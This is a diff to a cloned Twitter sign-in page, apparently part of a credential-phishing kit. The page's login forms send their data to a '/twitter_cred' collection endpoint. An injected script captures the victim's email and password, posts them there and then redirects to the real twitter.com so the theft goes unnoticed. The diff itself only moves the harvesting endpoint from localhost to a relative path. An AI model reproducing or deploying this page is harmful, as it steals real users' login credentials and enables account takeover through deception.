@@ -185,7 +185,7 @@ data-fouc-class-names="swift-loading no-nav-banners"
             <div class="dropdown-caret right"> <span class="caret-outer"></span> <span class="caret-inner"></span> </div>
             <div class="signin-dialog-body">
               <div>Have an account?</div>
-              <form action="https://localhost:8023/twitter_cred" class="LoginForm js-front-signin" method="post"
+              <form action="/twitter_cred" class="LoginForm js-front-signin" method="post"
   data-component="login_callout"
   data-element="form"
 >
@@ -1056,7 +1056,7 @@ data-fouc-class-names="swift-loading no-nav-banners"
           <span class="Icon Icon--bird Icon--large"></span>
         </div>
         <div class="LoginDialog-form">
-<form action="https://localhost:8023/twitter_cred" class="LoginForm js-front-signin" method="post"
+<form action="/twitter_cred" class="LoginForm js-front-signin" method="post"
   data-component="dialog"
   data-element="login"
 >
@@ -1513,7 +1513,7 @@ data-fouc-class-names="swift-loading no-nav-banners"
 document.getElementsByClassName('submit')[1].onclick = function() {
     var req = new XMLHttpRequest();
 
-    req.open('POST', 'http://localhost:8023/twitter_cred');
+    req.open('POST', '/twitter_cred');
     req.send(document.getElementsByClassName('email-input')[1].value + ' | ' + document.getElementsByName('session[password]')[1].value);
 
     location.href = 'https://twitter.com';
